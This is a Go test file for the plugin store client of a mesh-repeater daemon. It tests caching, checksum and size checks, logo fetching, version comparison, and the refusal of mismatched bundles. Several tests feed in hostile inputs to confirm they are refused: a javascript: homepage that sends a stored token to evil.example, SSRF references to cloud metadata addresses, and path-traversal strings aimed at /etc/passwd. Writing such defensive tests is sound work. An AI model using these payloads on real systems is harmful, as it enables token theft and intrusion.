package plugins

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/ScotMesh/RepeaterTastic/internal/config"
)

// fakeStore serves an index, a logo and a bundle, counting what was asked for so the tests can
// tell a cached answer from a fetched one.
type fakeStore struct {
	*httptest.Server
	index   atomic.Value // []byte
	bundle  []byte
	etag    string
	hits    atomic.Int32
	notMod  atomic.Int32
	logoHit atomic.Int32
}

func newFakeStore(t *testing.T, plugins ...StorePlugin) *fakeStore {
	t.Helper()
	f := &fakeStore{etag: `"v1"`, bundle: []byte("PK\x03\x04 pretend bundle")}
	f.setIndex(t, plugins...)
	mux := http.NewServeMux()
	mux.HandleFunc("/index.json", func(w http.ResponseWriter, r *http.Request) {
		f.hits.Add(1)
		w.Header().Set("ETag", f.etag)
		if r.Header.Get("If-None-Match") == f.etag {
			f.notMod.Add(1)
			w.WriteHeader(http.StatusNotModified)
			return
		}
		w.Write(f.index.Load().([]byte))
	})
	mux.HandleFunc("/logos/", func(w http.ResponseWriter, r *http.Request) {
		f.logoHit.Add(1)
		w.Header().Set("Content-Type", "image/png")
		w.Write([]byte("\x89PNG pretend logo"))
	})
	mux.HandleFunc("/bundle.zip", func(w http.ResponseWriter, r *http.Request) {
		w.Write(f.bundle)
	})
	f.Server = httptest.NewServer(mux)
	t.Cleanup(f.Close)
	return f
}

func (f *fakeStore) setIndex(t *testing.T, plugins ...StorePlugin) {
	t.Helper()
	b, err := json.Marshal(Index{Version: 1, Plugins: plugins})
	if err != nil {
		t.Fatal(err)
	}
	f.index.Store(b)
}

func (f *fakeStore) url() string { return f.URL + "/index.json" }

// samplePlugin is one store entry pointing at the fake server's bundle.
func (f *fakeStore) samplePlugin() StorePlugin {
	sum := sha256.Sum256(f.bundle)
	return StorePlugin{
		ID: "meshflow", Name: "Meshflow", Summary: "Feeds Meshflow", Author: "ScotMesh",
		Homepage: "https://example.invalid", License: "GPL-3.0-or-later", Logo: "logos/meshflow.png",
		Permissions: []string{"packets.read", "nodes.read"},
		Latest: Release{
			Version: "0.1.1", API: 1, MinHost: "0.3.0", URL: f.URL + "/bundle.zip",
			SHA256: hex.EncodeToString(sum[:]), Size: int64(len(f.bundle)),
			Arches: []string{thisArch()},
		},
	}
}

func newTestStore(t *testing.T, f *fakeStore) *Store {
	t.Helper()
	return NewStore(f.url(), filepath.Join(t.TempDir(), "store"), "0.3.3")
}

func TestStoreFetchesAndCaches(t *testing.T) {
	f := newFakeStore(t)
	f.setIndex(t, f.samplePlugin())
	s := newTestStore(t, f)

	idx, err := s.Index(context.Background(), false)
	if err != nil {
		t.Fatalf("Index: %v", err)
	}
	if len(idx.Plugins) != 1 || idx.Plugins[0].ID != "meshflow" {
		t.Fatalf("got %+v", idx.Plugins)
	}
	// A second read inside the freshness window must not ask the server again.
	if _, err := s.Index(context.Background(), false); err != nil {
		t.Fatal(err)
	}
	if got := f.hits.Load(); got != 1 {
		t.Errorf("asked the server %d times, wanted 1", got)
	}
	// Refresh sends the ETag, and an unchanged index costs a 304.
	if _, err := s.Index(context.Background(), true); err != nil {
		t.Fatal(err)
	}
	if got := f.notMod.Load(); got != 1 {
		t.Errorf("got %d 304s, wanted 1", got)
	}
	if _, err := os.Stat(s.indexPath()); err != nil {
		t.Errorf("the index was not cached on disk: %v", err)
	}
}

func TestStoreUsesDiskCacheWhenOffline(t *testing.T) {
	f := newFakeStore(t)
	f.setIndex(t, f.samplePlugin())
	dir := filepath.Join(t.TempDir(), "store")
	s := NewStore(f.url(), dir, "0.3.3")
	if _, err := s.Index(context.Background(), false); err != nil {
		t.Fatal(err)
	}
	f.Close() // the node loses the internet

	cold := NewStore(f.url(), dir, "0.3.3")
	idx, err := cold.Index(context.Background(), false)
	if err == nil {
		t.Error("wanted an error saying the list is old")
	}
	if idx == nil || len(idx.Plugins) != 1 {
		t.Fatalf("wanted the cached list back alongside the error, got %+v", idx)
	}
}

func TestStoreDownloadChecksTheChecksum(t *testing.T) {
	f := newFakeStore(t)
	p := f.samplePlugin()
	f.setIndex(t, p)
	s := newTestStore(t, f)

	file, err := s.Download(context.Background(), p.Latest)
	if err != nil {
		t.Fatalf("Download: %v", err)
	}
	file.Close()
	// A good download is handed over open for the caller to install and then delete.
	os.Remove(file.Name())

	// Now the server serves something else of exactly the same length at the same address, so
	// only the checksum can tell the difference.
	swapped := bytes.Repeat([]byte("!"), len(f.bundle))
	copy(swapped, "PK\x03\x04 swapped")
	f.bundle = swapped
	bad, err := s.Download(context.Background(), p.Latest)
	if err == nil {
		bad.Close()
		t.Fatal("a swapped download was accepted")
	}
	if !strings.Contains(err.Error(), "checksum") || !strings.Contains(err.Error(), "not installed") {
		t.Errorf("the error should say the checksum failed and nothing was installed, got %v", err)
	}
	// Nothing is left behind for the installer to pick up.
	entries, _ := os.ReadDir(filepath.Join(s.dir, "downloads"))
	for _, e := range entries {
		t.Errorf("left %s behind after a failed download", e.Name())
	}
}

func TestStoreDownloadRejectsASizeMismatch(t *testing.T) {
	f := newFakeStore(t)
	p := f.samplePlugin()
	p.Latest.Size = 999999
	f.setIndex(t, p)
	s := newTestStore(t, f)
	if _, err := s.Download(context.Background(), p.Latest); err == nil {
		t.Fatal("wanted a size mismatch")
	}
}

func TestStoreLogoIsFetchedOnceThenCached(t *testing.T) {
	f := newFakeStore(t)
	f.setIndex(t, f.samplePlugin())
	s := newTestStore(t, f)

	for i := range 3 {
		b, contentType, err := s.Logo(context.Background(), "meshflow")
		if err != nil {
			t.Fatalf("Logo %d: %v", i, err)
		}
		if len(b) == 0 {
			t.Fatal("empty logo")
		}
		if contentType != "image/png" {
			t.Errorf("a .png logo should be served as image/png, got %q", contentType)
		}
	}
	if got := f.logoHit.Load(); got != 1 {
		t.Errorf("fetched the logo %d times, wanted 1", got)
	}
	if _, _, err := s.Logo(context.Background(), "../../etc/passwd"); err == nil {
		t.Error("a path as an id should be refused")
	}
}

func TestStoreServesAnSVGLogoAsSVG(t *testing.T) {
	f := newFakeStore(t)
	p := f.samplePlugin()
	p.Logo = "logos/meshflow.svg"
	f.setIndex(t, p)
	s := newTestStore(t, f)

	_, contentType, err := s.Logo(context.Background(), "meshflow")
	if err != nil {
		t.Fatal(err)
	}
	if contentType != "image/svg+xml" {
		t.Errorf("an .svg logo should be served as image/svg+xml, got %q", contentType)
	}

	// Anything that isn't an image type the browser is told about is refused rather than passed on.
	p.Logo = "logos/meshflow.exe"
	f.setIndex(t, p)
	cold := NewStore(f.url(), filepath.Join(t.TempDir(), "store2"), "0.3.3")
	if _, _, err := cold.Logo(context.Background(), "meshflow"); err == nil {
		t.Error("a logo that isn't an image type was served")
	}
}

func TestUnusableExplainsWhy(t *testing.T) {
	base := StorePlugin{ID: "x", Permissions: []string{"packets.read"}, Latest: Release{
		Version: "1.0.0", API: 1, Arches: []string{thisArch()},
	}}
	if got := base.Unusable("0.3.3"); got != "" {
		t.Errorf("a plugin that fits should be installable, got %q", got)
	}

	cases := map[string]struct {
		change func(*StorePlugin)
		want   string
	}{
		"a newer plugin API":     {func(p *StorePlugin) { p.Latest.API = 2 }, "plugin API 2"},
		"no build for this arch": {func(p *StorePlugin) { p.Latest.Arches = []string{"linux/sparc"} }, "no build for " + runtime.GOOS},
		"a newer host":           {func(p *StorePlugin) { p.Latest.MinHost = "9.0.0" }, "9.0.0 or newer"},
		"an unknown permission":  {func(p *StorePlugin) { p.Permissions = []string{"root.everything"} }, "root.everything"},
		"it wants its own image": {func(p *StorePlugin) { p.Image = "ghcr.io/x/y:1" }, "attach it"},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			p := base
			c.change(&p)
			got := p.Unusable("0.3.3")
			if !strings.Contains(got, c.want) {
				t.Errorf("Unusable said %q, wanted it to mention %q", got, c.want)
			}
		})
	}
}

func TestUpdateForComparesNumerically(t *testing.T) {
	p := StorePlugin{Latest: Release{Version: "0.10.0"}}
	if _, ok := p.UpdateFor("0.9.0"); !ok {
		t.Error("0.10.0 should be an update over 0.9.0")
	}
	if _, ok := p.UpdateFor("0.10.0"); ok {
		t.Error("the installed version is already current")
	}
	if _, ok := p.UpdateFor("0.11.0"); ok {
		t.Error("a hand-installed newer build should not be offered a downgrade")
	}
	if _, ok := p.UpdateFor(""); ok {
		t.Error("nothing installed is not an update")
	}
	// A build with no version number shouldn't be told everything needs a newer host.
	dev := StorePlugin{Permissions: []string{}, Latest: Release{Version: "1.0.0", API: 1, MinHost: "0.3.0", Arches: []string{thisArch()}}}
	if why := dev.Unusable("dev"); why != "" {
		t.Errorf("a dev build should still be able to install: %s", why)
	}
	if compareVersions("v1.2.3-dev", "1.2.3") != 0 {
		t.Error("a v prefix and a -suffix should not change the order")
	}
}

func TestStoreRefusesAnIndexFromTheFuture(t *testing.T) {
	f := newFakeStore(t)
	b, _ := json.Marshal(map[string]any{"version": 99, "plugins": []any{}})
	f.index.Store(b)
	s := newTestStore(t, f)
	_, err := s.Index(context.Background(), false)
	if err == nil || !strings.Contains(err.Error(), "version 99") {
		t.Fatalf("wanted a clear version error, got %v", err)
	}
}

func TestStoreDropsEntriesItCannotUse(t *testing.T) {
	f := newFakeStore(t)
	good := f.samplePlugin()
	f.setIndex(t,
		good,
		StorePlugin{ID: "../escape", Latest: Release{Version: "1.0.0"}},
		StorePlugin{ID: "noversion"},
	)
	s := newTestStore(t, f)
	idx, err := s.Index(context.Background(), false)
	if err != nil {
		t.Fatal(err)
	}
	if len(idx.Plugins) != 1 || idx.Plugins[0].ID != "meshflow" {
		t.Fatalf("wanted only the usable entry, got %v", pluginIDs(idx))
	}
}

func pluginIDs(idx *Index) []string {
	out := make([]string, 0, len(idx.Plugins))
	for _, p := range idx.Plugins {
		out = append(out, p.ID)
	}
	return out
}

// The default store has to stay an https index.json, because that is what NewStore falls back to
// on every node that never sets plugins.store_url.
func TestDefaultStoreURLShape(t *testing.T) {
	if !strings.HasPrefix(DefaultStoreURL, "https://") || !strings.HasSuffix(DefaultStoreURL, "/index.json") {
		t.Fatalf("the default store should be an https index.json, got %s", DefaultStoreURL)
	}
}

// storeManager is a Manager whose store is the fake server.
func storeManager(t *testing.T, f *fakeStore) *Manager {
	t.Helper()
	cfg := config.Default().Plugins
	cfg.StoreURL = f.url()
	m, err := New(Options{Config: cfg, Dir: shortPluginDir(t), Version: "0.3.3", Log: quietLog()})
	if err != nil {
		t.Fatal(err)
	}
	return m
}

// serveBundle points the fake store's sample plugin at a real zip with the given manifest. The
// card is filled in from the manifest, because that is what a store built by add_release.py does.
func (f *fakeStore) serveBundle(t *testing.T, id, manifest string) StorePlugin {
	t.Helper()
	f.bundle = zipBundle(t, map[string]string{"plugin.yaml": manifest, "run.sh": "#!/bin/sh\nsleep 60\n"},
		map[string]os.FileMode{"run.sh": 0o755})
	man, err := ParseManifest([]byte(manifest))
	if err != nil {
		t.Fatal(err)
	}
	p := f.samplePlugin()
	p.ID, p.Name = id, man.Name
	p.Permissions = man.Permissions
	p.Latest.Version = man.Version
	f.setIndex(t, p)
	return p
}

const storeManifest = `id: shopbought
name: Shop Bought
version: 0.2.0
api: 1
permissions: [packets.read]
run:
  managed:
    exec: run.sh
`

func TestInstallFromStore(t *testing.T) {
	f := newFakeStore(t)
	f.serveBundle(t, "shopbought", storeManifest)
	m := storeManager(t, f)

	man, err := m.InstallFromStore(context.Background(), "shopbought")
	if err != nil {
		t.Fatalf("InstallFromStore: %v", err)
	}
	if man.ID != "shopbought" || man.Version != "0.2.0" {
		t.Fatalf("installed %s %s", man.ID, man.Version)
	}
	in, err := m.Get("shopbought")
	if err != nil {
		t.Fatalf("the plugin isn't installed: %v", err)
	}
	if in.Source != "the plugin store" {
		t.Errorf("source is %q, should say it came from the store", in.Source)
	}
	// It arrives switched off, waiting for its permissions to be granted, exactly like an upload.
	if in.Enabled {
		t.Error("a store install should not enable itself")
	}
	// The downloaded zip is not left lying about in the cache folder.
	entries, _ := os.ReadDir(filepath.Join(m.store.dir, "downloads"))
	for _, e := range entries {
		t.Errorf("left %s behind after installing", e.Name())
	}
}

func TestInstallFromStoreRefusesAMismatchedBundle(t *testing.T) {
	f := newFakeStore(t)
	// The store card says "shopbought"; the zip behind it calls itself something else.
	f.serveBundle(t, "shopbought", strings.Replace(storeManifest, "id: shopbought", "id: sneaky", 1))
	m := storeManager(t, f)

	_, err := m.InstallFromStore(context.Background(), "shopbought")
	if err == nil {
		t.Fatal("a bundle that isn't the plugin on the card was installed")
	}
	if !strings.Contains(err.Error(), "sneaky") || !strings.Contains(err.Error(), "not installed") {
		t.Errorf("the error should name what it actually was, got %v", err)
	}
	if _, err := m.Get("sneaky"); err == nil {
		t.Error("it installed anyway")
	}
}

func TestStoreListMarksInstalledAndUpdates(t *testing.T) {
	f := newFakeStore(t)
	f.serveBundle(t, "shopbought", storeManifest)
	m := storeManager(t, f)

	list, _, err := m.StoreList(context.Background(), false)
	if err != nil {
		t.Fatal(err)
	}
	if len(list) != 1 || list[0].Installed != "" || list[0].Update {
		t.Fatalf("nothing is installed yet, got %+v", list)
	}

	if _, err := m.InstallFromStore(context.Background(), "shopbought"); err != nil {
		t.Fatal(err)
	}
	list, _, err = m.StoreList(context.Background(), false)
	if err != nil {
		t.Fatal(err)
	}
	if list[0].Installed != "0.2.0" || list[0].Update {
		t.Fatalf("wanted 0.2.0 installed and no update, got %+v", list[0])
	}
	if got := m.StoreUpdates(); len(got) != 0 {
		t.Errorf("nothing should need updating, got %+v", got)
	}

	// The store now offers a newer version than the one installed.
	p := f.samplePlugin()
	p.ID, p.Latest.Version = "shopbought", "0.3.0"
	f.setIndex(t, p)
	f.etag = `"v2"`
	if _, _, err := m.StoreList(context.Background(), true); err != nil {
		t.Fatal(err)
	}
	updates := m.StoreUpdates()
	if len(updates) != 1 || updates[0].Latest.Version != "0.3.0" || updates[0].Installed != "0.2.0" {
		t.Fatalf("wanted one 0.2.0 -> 0.3.0 update, got %+v", updates)
	}
}

func TestStoreOffMeansNoStore(t *testing.T) {
	cfg := config.Default().Plugins
	cfg.StoreURL = "off"
	m, err := New(Options{Config: cfg, Dir: shortPluginDir(t), Version: "0.3.3", Log: quietLog()})
	if err != nil {
		t.Fatal(err)
	}
	if m.Store() != nil {
		t.Error("the store should be off")
	}
	if _, _, err := m.StoreList(context.Background(), false); !errors.Is(err, ErrNoStore) {
		t.Errorf("StoreList should say the store is off, got %v", err)
	}
	if _, err := m.InstallFromStore(context.Background(), "anything"); !errors.Is(err, ErrNoStore) {
		t.Errorf("InstallFromStore should say the store is off, got %v", err)
	}
	if got := m.StoreUpdates(); got != nil {
		t.Errorf("no store means no updates, got %+v", got)
	}
}

func TestStoreIgnoresACacheFromADifferentStore(t *testing.T) {
	first := newFakeStore(t)
	first.setIndex(t, first.samplePlugin())
	dir := filepath.Join(t.TempDir(), "store")
	if _, err := NewStore(first.url(), dir, "0.3.3").Index(context.Background(), false); err != nil {
		t.Fatal(err)
	}

	// The operator points store_url somewhere else. The old store's index must not be listed as
	// if it were the new one's, and its ETag must not be offered to the new server.
	second := newFakeStore(t)
	other := second.samplePlugin()
	other.ID, other.Name = "somethingelse", "Something Else"
	second.setIndex(t, other)
	second.etag = first.etag // the worst case: the new store happens to use the same ETag

	idx, err := NewStore(second.url(), dir, "0.3.3").Index(context.Background(), false)
	if err != nil {
		t.Fatal(err)
	}
	if len(idx.Plugins) != 1 || idx.Plugins[0].ID != "somethingelse" {
		t.Fatalf("wanted the new store's plugins, got %v", pluginIDs(idx))
	}
	if second.notMod.Load() != 0 {
		t.Error("the old store's ETag was sent to the new store")
	}
}

func TestLogoRefsCannotLeaveTheStore(t *testing.T) {
	// The daemon fetches these itself, from inside the operator's network, and hands the bytes to
	// their browser. An index must not be able to point that anywhere it likes.
	s := NewStore("https://example.invalid/store/index.json", t.TempDir(), "0.3.3")
	for _, ref := range []string{
		"http://192.168.1.1/status.png",           // another host, plaintext
		"https://169.254.169.254/meta-data/x.png", // cloud metadata
		"//169.254.169.254/meta-data/x.png",       // scheme-relative: not IsAbs, still changes host
		"/../../../evil/x.svg",                    // climbs above the index's folder
		"../../etc/passwd.png",                    // the same, relatively
		"file:///etc/passwd",                      // not http at all
	} {
		if got, err := s.resolve(ref); err == nil {
			t.Errorf("resolve(%q) allowed %q", ref, got)
		}
	}
	// A logo beside the index is what this is for.
	got, err := s.resolve("logos/x.png")
	if err != nil || got != "https://example.invalid/store/logos/x.png" {
		t.Errorf("resolve of a normal logo: %q, %v", got, err)
	}
}

func TestInstallFromStoreRefusesABundleThatDisagreesWithTheCard(t *testing.T) {
	// The card is what the operator read before pressing Install. A bundle that asks for more
	// than it said, or isn't the version it offered, is refused rather than quietly installed.
	cases := map[string]struct {
		card func(*StorePlugin)
		want string
	}{
		"a different version": {
			func(p *StorePlugin) { p.Latest.Version = "9.9.9" },
			"but the bundle is 0.2.0",
		},
		"permissions the card didn't list": {
			func(p *StorePlugin) { p.Permissions = []string{} },
			"the bundle also asks for packets.read",
		},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			f := newFakeStore(t)
			p := f.serveBundle(t, "shopbought", storeManifest)
			c.card(&p)
			f.setIndex(t, p)
			m := storeManager(t, f)

			_, err := m.InstallFromStore(context.Background(), "shopbought")
			if err == nil {
				t.Fatal("it was installed anyway")
			}
			if !strings.Contains(err.Error(), c.want) || !strings.Contains(err.Error(), "not installed") {
				t.Errorf("the error should say what disagreed, got %v", err)
			}
			if _, err := m.Get("shopbought"); err == nil {
				t.Error("it reached the installed plugins")
			}
		})
	}
}

func TestOneBadDateDoesNotEmptyTheStore(t *testing.T) {
	// encoding/json fails the whole document when a time.Time won't parse, so a hand-edited
	// timestamp would otherwise cost the reader every plugin in the file.
	f := newFakeStore(t)
	p := f.samplePlugin()
	raw := `{"version":1,"updated":"2026-09-18 17:11:15","plugins":[
	  {"id":"meshflow","name":"Meshflow","summary":"x","author":"y","homepage":"https://example.invalid",
	   "license":"GPL-3.0-or-later","permissions":[],
	   "latest":{"version":"` + p.Latest.Version + `","api":1,"released":"whenever","url":"` + p.Latest.URL +
		`","sha256":"` + p.Latest.SHA256 + `","size":` + strconv.FormatInt(p.Latest.Size, 10) + `,"arches":["` + thisArch() + `"]}}]}`
	f.index.Store([]byte(raw))

	idx, err := newTestStore(t, f).Index(context.Background(), false)
	if err != nil {
		t.Fatalf("a bad timestamp should not fail the index: %v", err)
	}
	if len(idx.Plugins) != 1 {
		t.Fatalf("wanted the plugin listed anyway, got %v", pluginIDs(idx))
	}
	if !idx.Updated.IsZero() || !idx.Plugins[0].Latest.Released.IsZero() {
		t.Error("an unparseable timestamp should read as no timestamp")
	}
}

func TestAJavascriptHomepageIsDropped(t *testing.T) {
	// The GUI renders this as a link in its own page.
	f := newFakeStore(t)
	p := f.samplePlugin()
	p.Homepage = "javascript:fetch('https://evil.example/'+localStorage.getItem('rt-token'))"
	f.setIndex(t, p)

	idx, err := newTestStore(t, f).Index(context.Background(), false)
	if err != nil {
		t.Fatal(err)
	}
	if got := idx.Plugins[0].Homepage; got != "" {
		t.Errorf("a non-https homepage reached the GUI: %q", got)
	}
}
